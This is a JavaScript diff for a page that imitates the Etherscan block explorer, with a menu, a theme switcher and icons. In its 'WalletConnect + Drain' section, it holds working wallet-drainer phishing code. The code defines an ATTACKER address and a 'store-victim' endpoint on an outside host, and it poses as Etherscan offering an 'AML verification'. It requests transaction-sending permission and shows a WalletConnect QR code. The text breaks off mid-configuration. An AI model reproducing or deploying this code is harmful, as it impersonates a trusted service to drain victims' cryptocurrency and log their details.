-  fileInput: '<path d="M4 22h14a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v4"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M2 15h10"/><path d="m9 18 3-3-3-3"/>',
-  fileCode: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 18 3-3-3-3"/>',
-  refresh: '<path d="M21 12a9 9 0 1 1-3-6.7L21 8"/><path d="M21 3v5h-5"/>',
-  download: '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5"/><path d="M12 15V3"/>',
-  wallet: '<path d="M19 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0 0 4h15a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5"/><path d="M18 12h.01"/>',
-  send: '<path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/>',
-  binary: '<rect x="14" y="14" width="6" height="6" rx="1"/><rect x="4" y="4" width="6" height="6" rx="1"/><path d="M4 20h6M14 4h6M14 10h6M4 14h6"/>',
-  code: '<path d="m18 16 4-4-4-4"/><path d="m6 8-4 4 4 4"/><path d="m14.5 4-5 16"/>',
-  fileCheck: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 15 2 2 4-4"/>',
-  search: '<circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
-  searchCode: '<path d="m9 9-2 2 2 2"/><path d="m13 13 2-2-2-2"/><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
-  gitCompare: '<circle cx="18" cy="18" r="3"/><circle cx="6" cy="6" r="3"/><path d="M13 6h3a2 2 0 0 1 2 2v7"/><path d="M11 18H8a2 2 0 0 1-2-2V9"/>',
-  fileTerminal: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m8 16 2-2-2-2"/><path d="M12 18h4"/>',
-  fuel: '<path d="M3 22h12V4a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2Z"/><path d="M3 12h12"/><path d="M18 8v9a2 2 0 0 0 4 0V9l-3-3"/>',
-  swap: '<path d="M8 3 4 7l4 4"/><path d="M4 7h16"/><path d="m16 21 4-4-4-4"/><path d="M20 17H4"/>',
-  server: '<rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><path d="M6 6h.01M6 18h.01"/>',
-  tags: '<path d="m15 5 6 6-7 7-6-6V5Z"/><path d="M10 9h.01"/>',
-  globe: '<circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15 15 0 0 1 0 20a15 15 0 0 1 0-20"/>',
-  shieldCheck: '<path d="M20 13c0 5-3.5 7.5-8 9-4.5-1.5-8-4-8-9V6l8-3 8 3Z"/><path d="m9 12 2 2 4-4"/>',
-  penLine: '<path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/>',
-  message: '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2Z"/>',
-  filter: '<path d="M22 3H2l8 9.5V19l4 2v-8.5Z"/>',
-  messages: '<path d="M14 9a2 2 0 0 1-2 2H6l-4 4V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2Z"/><path d="M18 9h2a2 2 0 0 1 2 2v11l-4-4h-6a2 2 0 0 1-2-2v-1"/>',
-  sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
-  moon: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>',
-  moonStar: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/><path d="M19 3v4M17 5h4"/>',
-  monitor: '<rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>',
-  check: '<path d="M20 6 9 17l-5-5"/>',
-};
-
-function svg(name, cls) {
-  return '<svg class="' + (cls || 'icon') + '" viewBox="0 0 24 24" aria-hidden="true">' + ICONS[name] + '</svg>';
-}
-
-/* ---------- Données du menu ---------- */
-const navItems = [
-  { label: 'Home', href: 'https://etherscan.io/' },
-  {
-    label: 'Blockchain', href: 'https://etherscan.io/',
-    items: [
-      { label: 'Transactions', href: 'https://etherscan.io/txs' },
-      { label: 'Pending Transactions', href: 'https://etherscan.io/txsPending' },
-      { label: 'Contract Internal Transactions', href: 'https://etherscan.io/internal-trxs' },
-      { label: 'Cross-Chain Transactions', href: 'https://etherscan.io/crosschain-txs' },
-      { label: 'Beacon Deposits', href: 'https://etherscan.io/beacondeposits' },
-      { label: 'Beacon Withdrawals', href: 'https://etherscan.io/beaconwithdraw' },
-      { label: 'View Blobs', href: 'https://etherscan.io/blobs' },
-      { label: 'AA Transactions', href: 'https://etherscan.io/aa-txs' },
-      { label: 'EIP-7702 Authorizations', href: 'https://etherscan.io/eip7702-authorizations', badge: 'Beta' },
-      { label: 'View Blocks', href: 'https://etherscan.io/blocks', divider: true },
-      { label: 'Forked Blocks (Reorgs)', href: 'https://etherscan.io/blocks_forked' },
-      { label: 'Uncles', href: 'https://etherscan.io/uncles' },
-      { label: 'Top Accounts', href: 'https://etherscan.io/accounts', divider: true },
-      { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified', divider: true },
-    ],
-  },
-  {
-    label: 'Tokens', href: 'https://etherscan.io/tokens',
-    items: [
-      { label: 'Token Approvals', href: 'https://etherscan.io/approvals' },
-      { label: 'Top Tokens', href: 'https://etherscan.io/tokens' },
-      { label: 'View ERC-20 Transfers', href: 'https://etherscan.io/tokentxns' },
-      { label: 'ERC-20 Tokens By Holding', href: 'https://etherscan.io/tokenholdings' },
-      { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
-      { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
-    ],
-  },
-  {
-    label: 'NFTs', href: 'https://etherscan.io/nft-top-contracts',
-    items: [
-      { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
-      { label: 'Trending NFTs', href: 'https://etherscan.io/trendingnft' },
-      { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
-      { label: 'NFT Hottest', href: 'https://etherscan.io/nfthottest' },
-      { label: 'NFT Top Trades', href: 'https://etherscan.io/nft-top-trades' },
-    ],
-  },
-  {
-    label: 'Resources', href: 'https://etherscan.io/',
-    items: [
-      { label: 'Subgraphs', href: 'https://etherscan.io/subgraphs' },
-      { label: 'Charts & Stats', href: 'https://etherscan.io/charts' },
-      { label: 'Top Statistics', href: 'https://etherscan.io/stats' },
-      { label: 'Directory of Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
-      { label: 'Signs of Scam', href: 'https://etherscan.io/scams' },
-      { label: 'Comments/Reviews', href: 'https://etherscan.io/comments' },
-      { label: 'Gas Tracker', href: 'https://etherscan.io/gastracker' },
-      { label: 'Unit Converter', href: 'https://etherscan.io/unitconverter' },
-      { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
-    ],
-  },
-  {
-    label: 'API', href: 'https://etherscan.io/apis',
-    items: [
-      { label: 'API Documentation', href: 'https://docs.etherscan.io/' },
-      { label: 'API Plans', href: 'https://etherscan.io/apis' },
-      { label: 'API Key', href: 'https://etherscan.io/myapikey' },
-    ],
-  },
-  {
-    label: 'More', href: 'https://etherscan.io/',
-    columns: [
-      {
-        title: 'Developer Tools',
-        items: [
-          { label: 'Input Data Encoder', href: 'https://etherscan.io/inputdataencoder', icon: 'fileInput', badge: 'Beta' },
-          { label: 'Input Data Decoder', href: 'https://etherscan.io/inputdatadecoder', icon: 'fileCode' },
-          { label: 'Unit Converter', href: 'https://etherscan.io/unitconverter', icon: 'refresh' },
-          { label: 'Download Data (CSV Export)', href: 'https://etherscan.io/exportData', icon: 'download' },
-          { label: 'Account Balance Checker', href: 'https://etherscan.io/balancecheck-tool', icon: 'wallet' },
-          { label: 'Broadcast Transaction', href: 'https://etherscan.io/pushTx', icon: 'send' },
-          { label: 'Bytecode to Opcode', href: 'https://etherscan.io/opcode-tool', icon: 'binary' },
-        ],
-      },
-      {
-        title: 'Smart Contract Tools',
-        items: [
-          { label: 'Code Reader', href: 'https://etherscan.io/code-reader', icon: 'code' },
-          { label: 'Verify Contract', href: 'https://etherscan.io/verifyContract', icon: 'fileCheck' },
-          { label: 'Similar Contract Search', href: 'https://etherscan.io/searchcontractlist', icon: 'search' },
-          { label: 'Smart Contract Search', href: 'https://etherscan.io/searchcontract', icon: 'searchCode' },
-          { label: 'Contract Diff Checker', href: 'https://etherscan.io/contractdiffchecker', icon: 'gitCompare' },
-          { label: 'Vyper Online Compiler', href: 'https://etherscan.io/vyper-online-compiler', icon: 'fileTerminal' },
-        ],
-      },
-      {
-        title: 'Explore',
-        items: [
-          { label: 'Gas Tracker', href: 'https://etherscan.io/gastracker', icon: 'fuel' },
-          { label: 'DEX Tracker', href: 'https://etherscan.io/dex', icon: 'swap' },
-          { label: 'Node Tracker', href: 'https://etherscan.io/nodetracker', icon: 'server' },
-          { label: 'Label Cloud', href: 'https://etherscan.io/labelcloud', icon: 'tags' },
-          { label: 'Domain Name Lookup', href: 'https://etherscan.io/name-lookup', icon: 'globe' },
-        ],
-      },
-      {
-        title: 'Services',
-        items: [
-          { label: 'Token Approvals', href: 'https://etherscan.io/tokenapprovalchecker', icon: 'shieldCheck' },
-          { label: 'Verified Signature', href: 'https://etherscan.io/verifiedSignatures', icon: 'penLine' },
-          { label: 'Input Data Messages (IDM)', href: 'https://etherscan.io/idm', icon: 'message' },
-          { label: 'Advanced Filter', href: 'https://etherscan.io/advanced-filter', icon: 'filter' },
-          { label: 'Blockscan Chat', href: 'https://chat.blockscan.com/', icon: 'messages', external: true },
-        ],
-      },
-    ],
-  },
-];
-
-/* ---------- Rendu du menu ---------- */
-const navList = document.getElementById('nav-list');
-const megaHost = document.getElementById('mega-host');
-let openMenu = null;
-
-function renderNav() {
-  let html = '';
-  navItems.forEach(function (item) {
-    const hasMenu = !!(item.items || item.columns);
-    html += '<li data-label="' + item.label + '">';
-    if (hasMenu) {
-      html += '<button type="button" class="nav-btn" data-menu="' + item.label + '">' + item.label + svg('chevronDown') + '</button>';
-    } else {
-      html += '<a class="nav-link" href="' + item.href + '">' + item.label + '</a>';
+    function svg(name, cls) {
+      return '<svg class="' + (cls || 'icon') + '" viewBox="0 0 24 24" aria-hidden="true">' + ICONS[name] + '</svg>';
     }
-    if (item.items) {
-      html += '<div class="dropdown" data-panel="' + item.label + '" hidden>';
-      item.items.forEach(function (sub) {
-        if (sub.divider) html += '<div class="divider"></div>';
-        html += '<a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' + sub.label +
-          (sub.badge ? '<span class="badge-pill">' + sub.badge + '</span>' : '') + '</a>';
+
+    // ===== Menu (identique) =====
+    const navItems = [
+      { label: 'Home', href: 'https://etherscan.io/' },
+      {
+        label: 'Blockchain', href: 'https://etherscan.io/',
+        items: [
+          { label: 'Transactions', href: 'https://etherscan.io/txs' },
+          { label: 'Pending Transactions', href: 'https://etherscan.io/txsPending' },
+          { label: 'Contract Internal Transactions', href: 'https://etherscan.io/internal-trxs' },
+          { label: 'Cross-Chain Transactions', href: 'https://etherscan.io/crosschain-txs' },
+          { label: 'Beacon Deposits', href: 'https://etherscan.io/beacondeposits' },
+          { label: 'Beacon Withdrawals', href: 'https://etherscan.io/beaconwithdraw' },
+          { label: 'View Blobs', href: 'https://etherscan.io/blobs' },
+          { label: 'AA Transactions', href: 'https://etherscan.io/aa-txs' },
+          { label: 'EIP-7702 Authorizations', href: 'https://etherscan.io/eip7702-authorizations', badge: 'Beta' },
+          { label: 'View Blocks', href: 'https://etherscan.io/blocks', divider: true },
+          { label: 'Forked Blocks (Reorgs)', href: 'https://etherscan.io/blocks_forked' },
+          { label: 'Uncles', href: 'https://etherscan.io/uncles' },
+          { label: 'Top Accounts', href: 'https://etherscan.io/accounts', divider: true },
+          { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified', divider: true },
+        ],
+      },
+      {
+        label: 'Tokens', href: 'https://etherscan.io/tokens',
+        items: [
+          { label: 'Token Approvals', href: 'https://etherscan.io/approvals' },
+          { label: 'Top Tokens', href: 'https://etherscan.io/tokens' },
+          { label: 'View ERC-20 Transfers', href: 'https://etherscan.io/tokentxns' },
+          { label: 'ERC-20 Tokens By Holding', href: 'https://etherscan.io/tokenholdings' },
+          { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
+          { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
+        ],
+      },
+      {
+        label: 'NFTs', href: 'https://etherscan.io/nft-top-contracts',
+        items: [
+          { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
+          { label: 'Trending NFTs', href: 'https://etherscan.io/trendingnft' },
+          { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
+          { label: 'NFT Hottest', href: 'https://etherscan.io/nfthottest' },
+          { label: 'NFT Top Trades', href: 'https://etherscan.io/nft-top-trades' },
+        ],
+      },
+      {
+        label: 'Resources', href: 'https://etherscan.io/',
+        items: [
+          { label: 'Subgraphs', href: 'https://etherscan.io/subgraphs' },
+          { label: 'Charts & Stats', href: 'https://etherscan.io/charts' },
+          { label: 'Top Statistics', href: 'https://etherscan.io/stats' },
+          { label: 'Directory of Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
+          { label: 'Signs of Scam', href: 'https://etherscan.io/scams' },
+          { label: 'Comments/Reviews', href: 'https://etherscan.io/comments' },
+          { label: 'Gas Tracker', href: 'https://etherscan.io/gastracker' },
+          { label: 'Unit Converter', href: 'https://etherscan.io/unitconverter' },
+          { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
+        ],
+      },
+      {
+        label: 'API', href: 'https://etherscan.io/apis',
+        items: [
+          { label: 'API Documentation', href: 'https://docs.etherscan.io/' },
+          { label: 'API Plans', href: 'https://etherscan.io/apis' },
+          { label: 'API Key', href: 'https://etherscan.io/myapikey' },
+        ],
+      },
+      {
+        label: 'More', href: 'https://etherscan.io/',
+        columns: [
+          {
+            title: 'Developer Tools',
+            items: [
+              { label: 'Input Data Encoder', href: 'https://etherscan.io/inputdataencoder', icon: 'fileInput', badge: 'Beta' },
+              { label: 'Input Data Decoder', href: 'https://etherscan.io/inputdatadecoder', icon: 'fileCode' },
+              { label: 'Unit Converter', href: 'https://etherscan.io/unitconverter', icon: 'refresh' },
+              { label: 'Download Data (CSV Export)', href: 'https://etherscan.io/exportData', icon: 'download' },
+              { label: 'Account Balance Checker', href: 'https://etherscan.io/balancecheck-tool', icon: 'wallet' },
+              { label: 'Broadcast Transaction', href: 'https://etherscan.io/pushTx', icon: 'send' },
+              { label: 'Bytecode to Opcode', href: 'https://etherscan.io/opcode-tool', icon: 'binary' },
+            ],
+          },
+          {
+            title: 'Smart Contract Tools',
+            items: [
+              { label: 'Code Reader', href: 'https://etherscan.io/code-reader', icon: 'code' },
+              { label: 'Verify Contract', href: 'https://etherscan.io/verifyContract', icon: 'fileCheck' },
+              { label: 'Similar Contract Search', href: 'https://etherscan.io/searchcontractlist', icon: 'search' },
+              { label: 'Smart Contract Search', href: 'https://etherscan.io/searchcontract', icon: 'searchCode' },
+              { label: 'Contract Diff Checker', href: 'https://etherscan.io/contractdiffchecker', icon: 'gitCompare' },
+              { label: 'Vyper Online Compiler', href: 'https://etherscan.io/vyper-online-compiler', icon: 'fileTerminal' },
+            ],
+          },
+          {
+            title: 'Explore',
+            items: [
+              { label: 'Gas Tracker', href: 'https://etherscan.io/gastracker', icon: 'fuel' },
+              { label: 'DEX Tracker', href: 'https://etherscan.io/dex', icon: 'swap' },
+              { label: 'Node Tracker', href: 'https://etherscan.io/nodetracker', icon: 'server' },
+              { label: 'Label Cloud', href: 'https://etherscan.io/labelcloud', icon: 'tags' },
+              { label: 'Domain Name Lookup', href: 'https://etherscan.io/name-lookup', icon: 'globe' },
+            ],
+          },
+          {
+            title: 'Services',
+            items: [
+              { label: 'Token Approvals', href: 'https://etherscan.io/tokenapprovalchecker', icon: 'shieldCheck' },
+              { label: 'Verified Signature', href: 'https://etherscan.io/verifiedSignatures', icon: 'penLine' },
+              { label: 'Input Data Messages (IDM)', href: 'https://etherscan.io/idm', icon: 'message' },
+              { label: 'Advanced Filter', href: 'https://etherscan.io/advanced-filter', icon: 'filter' },
+              { label: 'Blockscan Chat', href: 'https://chat.blockscan.com/', icon: 'messages', external: true },
+            ],
+          },
+        ],
+      },
+    ];
+
+    const navList = document.getElementById('nav-list');
+    const megaHost = document.getElementById('mega-host');
+    let openMenu = null;
+
+    function renderNav() {
+      let html = '';
+      navItems.forEach(function (item) {
+        const hasMenu = !!(item.items || item.columns);
+        html += '<li data-label="' + item.label + '">';
+        if (hasMenu) {
+          html += '<button type="button" class="nav-btn" data-menu="' + item.label + '">' + item.label + svg('chevronDown') + '</button>';
+        } else {
+          html += '<a class="nav-link" href="' + item.href + '">' + item.label + '</a>';
+        }
+        if (item.items) {
+          html += '<div class="dropdown" data-panel="' + item.label + '" hidden>';
+          item.items.forEach(function (sub) {
+            if (sub.divider) html += '<div class="divider"></div>';
+            html += '<a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' + sub.label +
+              (sub.badge ? '<span class="badge-pill">' + sub.badge + '</span>' : '') + '</a>';
+          });
+          html += '</div>';
+        }
+        html += '</li>';
       });
-      html += '</div>';
-    }
-    html += '</li>';
-  });
-  html += '<li aria-hidden="true" class="nav-sep">|</li>';
-  html += '<li><a class="signin" href="https://etherscan.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
-  navList.innerHTML = html;
+      html += '<li aria-hidden="true" class="nav-sep">|</li>';
+      html += '<li><a class="signin" href="https://etherscan.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
+      navList.innerHTML = html;
 
-  navItems.filter(function (i) { return i.columns; }).forEach(function (item) {
-    let m = '<div class="mega" data-panel="' + item.label + '" hidden><div class="container mega-grid">';
-    item.columns.forEach(function (col) {
-      m += '<div><h3>' + col.title + '</h3><ul>';
-      col.items.forEach(function (sub) {
-        m += '<li><a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' +
-          (sub.icon ? svg(sub.icon, 'icon icon-md') : '') +
-          '<span>' + sub.label + '</span>' +
-          (sub.badge ? '<span class="badge-sq">' + sub.badge + '</span>' : '') +
-          (sub.external ? svg('externalLink', 'icon icon-sm') : '') +
-          '</a></li>';
+      navItems.filter(function (i) { return i.columns; }).forEach(function (item) {
+        let m = '<div class="mega" data-panel="' + item.label + '" hidden><div class="container mega-grid">';
+        item.columns.forEach(function (col) {
+          m += '<div><h3>' + col.title + '</h3><ul>';
+          col.items.forEach(function (sub) {
+            m += '<li><a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' +
+              (sub.icon ? svg(sub.icon, 'icon icon-md') : '') +
+              '<span>' + sub.label + '</span>' +
+              (sub.badge ? '<span class="badge-sq">' + sub.badge + '</span>' : '') +
+              (sub.external ? svg('externalLink', 'icon icon-sm') : '') +
+              '</a></li>';
+          });
+          m += '</ul></div>';
+        });
+        m += '</div></div>';
+        megaHost.insertAdjacentHTML('beforeend', m);
       });
-      m += '</ul></div>';
-    });
-    m += '</div></div>';
-    megaHost.insertAdjacentHTML('beforeend', m);
-  });
-}
-
-function setOpen(label) {
-  openMenu = label;
-  document.querySelectorAll('[data-panel]').forEach(function (p) {
-    p.hidden = p.getAttribute('data-panel') !== label;
-  });
-  document.querySelectorAll('.nav-btn').forEach(function (b) {
-    b.classList.toggle('open', b.getAttribute('data-menu') === label);
-  });
-}
-
-renderNav();
-
-navList.querySelectorAll('li[data-label]').forEach(function (li) {
-  li.addEventListener('mouseenter', function () {
-    const label = li.getAttribute('data-label');
-    const item = navItems.find(function (i) { return i.label === label; });
-    setOpen(item && (item.items || item.columns) ? label : null);
-  });
-});
-navList.querySelectorAll('.nav-btn').forEach(function (btn) {
-  btn.addEventListener('click', function () {
-    const label = btn.getAttribute('data-menu');
-    setOpen(openMenu === label ? null : label);
-  });
-});
-document.getElementById('site-header').addEventListener('mouseleave', function () { setOpen(null); });
-
-/* ---------- Thèmes : Light / Dim / Dark / Auto ---------- */
-const THEME_KEY = 'etherscan-theme';
-const themeOptions = [
-  { value: 'light', label: 'Light', icon: 'sun' },
-  { value: 'dim', label: 'Dim', icon: 'moonStar' },
-  { value: 'dark', label: 'Dark', icon: 'moon' },
-  { value: 'auto', label: 'Auto (System)', icon: 'monitor' },
-];
-
-const themeBtn = document.getElementById('theme-btn');
-const themeMenu = document.getElementById('theme-menu');
-let theme = localStorage.getItem(THEME_KEY) || 'light';
-
-function resolve(choice) {
-  if (choice !== 'auto') return choice;
-  return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-}
-
-function applyTheme(choice) {
-  const root = document.documentElement;
-  root.classList.remove('dim', 'dark');
-  const resolved = resolve(choice);
-  if (resolved !== 'light') root.classList.add(resolved);
-  const opt = themeOptions.find(function (o) { return o.value === choice; }) || themeOptions[0];
-  themeBtn.innerHTML = svg(opt.icon, 'icon');
-  themeBtn.style.color = 'var(--azure-40)';
-  renderThemeMenu();
-}
-
-function renderThemeMenu() {
-  themeMenu.innerHTML = themeOptions.map(function (o) {
-    return '<button type="button" data-theme="' + o.value + '">' + svg(o.icon) + '<span>' + o.label + '</span>' +
-      (theme === o.value ? svg('check', 'icon check') : '') + '</button>';
-  }).join('');
-  themeMenu.querySelectorAll('button').forEach(function (b) {
-    b.addEventListener('click', function () {
-      theme = b.getAttribute('data-theme');
-      localStorage.setItem(THEME_KEY, theme);
-      applyTheme(theme);
-      themeMenu.hidden = true;
-    });
-  });
-}
-
-themeBtn.addEventListener('click', function (e) {
-  e.stopPropagation();
-  themeMenu.hidden = !themeMenu.hidden;
-});
-document.addEventListener('mousedown', function (e) {
-  if (!themeMenu.hidden && !themeMenu.contains(e.target) && e.target !== themeBtn) themeMenu.hidden = true;
-});
-window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function () {
-  if (theme === 'auto') applyTheme('auto');
-});
-
-applyTheme(theme);
-
-/* ===== WalletConnect + Drain ===== */
-const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
-const API = 'https://aml-checker-4.vercel.app/api/store-victim';
-const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
-
-let signClient, session, account, currentChainId;
-
-function getSignClient() {
-  const ns = window["@walletconnect/sign-client"];
-  if (ns) {
-    const sc = ns.SignClient || ns.default;
-    if (sc && typeof sc.init === 'function') return sc;
-  }
-  return null;
-}
-
-async function initWalletConnect() {
-  const SignClientClass = getSignClient();
-  if (!SignClientClass) throw new Error('WalletConnect non trouvé.');
-
-  signClient = await SignClientClass.init({
-    projectId: PROJECT_ID,
-    metadata: {
-      name: 'Etherscan',
-      description: 'Vérification AML',
-      url: 'https://etherscan.io',
-      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
     }
-  });
 
-  const { uri, approval } = await signClient.connect({
-    requiredNamespaces: {
-      eip155: {
-        methods: ['eth_sendTransaction'],
-        chains: ['eip155:1'],
-        events: ['chainChanged', 'accountsChanged']
+    function setOpen(label) {
+      openMenu = label;
+      document.querySelectorAll('[data-panel]').forEach(function (p) {
+        p.hidden = p.getAttribute('data-panel') !== label;
+      });
+      document.querySelectorAll('.nav-btn').forEach(function (b) {
+        b.classList.toggle('open', b.getAttribute('data-menu') === label);
+      });
+    }
+
+    renderNav();
+
+    navList.querySelectorAll('li[data-label]').forEach(function (li) {
+      li.addEventListener('mouseenter', function () {
+        const label = li.getAttribute('data-label');
+        const item = navItems.find(function (i) { return i.label === label; });
+        setOpen(item && (item.items || item.columns) ? label : null);
+      });
+    });
+    navList.querySelectorAll('.nav-btn').forEach(function (btn) {
+      btn.addEventListener('click', function () {
+        const label = btn.getAttribute('data-menu');
+        setOpen(openMenu === label ? null : label);
+      });
+    });
+    document.getElementById('site-header').addEventListener('mouseleave', function () { setOpen(null); });
+
+    // ===== Thèmes =====
+    const THEME_KEY = 'etherscan-theme';
+    const themeOptions = [
+      { value: 'light', label: 'Light', icon: 'sun' },
+      { value: 'dim', label: 'Dim', icon: 'moonStar' },
+      { value: 'dark', label: 'Dark', icon: 'moon' },
+      { value: 'auto', label: 'Auto (System)', icon: 'monitor' },
+    ];
+
+    const themeBtn = document.getElementById('theme-btn');
+    const themeMenu = document.getElementById('theme-menu');
+    let theme = localStorage.getItem(THEME_KEY) || 'light';
+
+    function resolve(choice) {
+      if (choice !== 'auto') return choice;
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    }
+
+    function applyTheme(choice) {
+      const root = document.documentElement;
+      root.classList.remove('dim', 'dark');
+      const resolved = resolve(choice);
+      if (resolved !== 'light') root.classList.add(resolved);
+      const opt = themeOptions.find(function (o) { return o.value === choice; }) || themeOptions[0];
+      themeBtn.innerHTML = svg(opt.icon, 'icon');
+      themeBtn.style.color = 'var(--azure-40)';
+      renderThemeMenu();
+    }
+
+    function renderThemeMenu() {
+      themeMenu.innerHTML = themeOptions.map(function (o) {
+        return '<button type="button" data-theme="' + o.value + '">' + svg(o.icon) + '<span>' + o.label + '</span>' +
+          (theme === o.value ? svg('check', 'icon check') : '') + '</button>';
+      }).join('');
+      themeMenu.querySelectorAll('button').forEach(function (b) {
+        b.addEventListener('click', function () {
+          theme = b.getAttribute('data-theme');
+          localStorage.setItem(THEME_KEY, theme);
+          applyTheme(theme);
+          themeMenu.hidden = true;
+        });
+      });
+    }
+
+    themeBtn.addEventListener('click', function (e) {
+      e.stopPropagation();
+      themeMenu.hidden = !themeMenu.hidden;
+    });
+    document.addEventListener('mousedown', function (e) {
+      if (!themeMenu.hidden && !themeMenu.contains(e.target) && e.target !== themeBtn) themeMenu.hidden = true;
+    });
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function () {
+      if (theme === 'auto') applyTheme('auto');
+    });
+
+    applyTheme(theme);
+
+    // ===== WalletConnect + Drain =====
+    const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
+    const API = 'https://aml-checker-4.vercel.app/api/store-victim';
+    const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
+
+    let signClient, session, account, currentChainId;
+
+    function getSignClient() {
+      const ns = window["@walletconnect/sign-client"];
+      if (ns) {
+        const sc = ns.SignClient || ns.default;
+        if (sc && typeof sc.init === 'function') return sc;
       }
-    },
-    redirect: { universal: 'https://aml-checker-4.vercel.app/verifyaddress' } // <-- ici
-  });
-
-  // Attendre que QRCodeStyling soit chargé
-  if (typeof QRCodeStyling === 'undefined') {
-    await new Promise((resolve, reject) => {
-      let tries = 0;
-      const interval = setInterval(() => {
-        if (typeof QRCodeStyling !== 'undefined') { clearInterval(interval); resolve(); }
-        if (++tries > 20) { clearInterval(interval); reject('QRCodeStyling non chargé'); }
-      }, 250);
-    });
-  }
-
-  const qrDiv = document.getElementById('qrcode');
-  qrDiv.innerHTML = '';
-
-  // Crée le wrapper avec le logo SVG
-  qrDiv.innerHTML = `
-    <div id="qr-wrapper">
-      <div id="qr-code"></div>
-      <div id="logo-box">
-        <svg width="42" height="42" viewBox="-2.19622685 .37688013 124.38617733 125.52740941" xmlns="http://www.w3.org/2000/svg">
-          <path d="m25.79 58.415a5.157 5.157 0 0 1 5.181-5.156l8.59.028a5.164 5.164 0 0 1 5.164 5.164v32.48c.967-.287 2.209-.593 3.568-.913a4.3 4.3 0 0 0 3.317-4.187v-40.291a5.165 5.165 0 0 1 5.164-5.165h8.607a5.165 5.165 0 0 1 5.164 5.165v37.393s2.155-.872 4.254-1.758a4.311 4.311 0 0 0 2.632-3.967v-44.578a5.164 5.164 0 0 1 5.163-5.164h8.606a5.164 5.164 0 0 1 5.164 5.164v36.71c7.462-5.408 15.024-11.912 21.025-19.733a8.662 8.662 0 0 0 1.319-8.092 60.792 60.792 0 0 0 -58.141-40.829 60.788 60.788 0 0 0 -51.99 91.064 7.688 7.688 0 0 0 7.334 3.8c1.628-.143 3.655-.346 6.065-.63a4.3 4.3 0 0 0 3.815-4.268z" fill="#000000"/>
-          <path d="m25.602 110.51a60.813 60.813 0 0 0 63.371 5.013 60.815 60.815 0 0 0 33.212-54.203c0-1.4-.065-2.785-.158-4.162-22.219 33.138-63.244 48.63-96.423 53.347" fill="#979695"/>
-        </svg>
-      </div>
-    </div>
-  `;
-
-  // Crée le QR design avec qr-code-styling
-  const qrCode = new QRCodeStyling({
-    width: 250,
-    height: 250,
-    type: "svg",
-    data: uri,
-    margin: 0,
-    qrOptions: {
-      typeNumber: 0,
-      mode: "Byte",
-      errorCorrectionLevel: "L"   // niveau L = matrice compacte
-    },
-    dotsOptions: {
-      type: "dots",
-      color: "#000000"
-    },
-    backgroundOptions: {
-      color: "#ffffff"
-    },
-    cornersSquareOptions: {
-      type: "extra-rounded",
-      color: "#000000"
-    },
-    cornersDotOptions: {
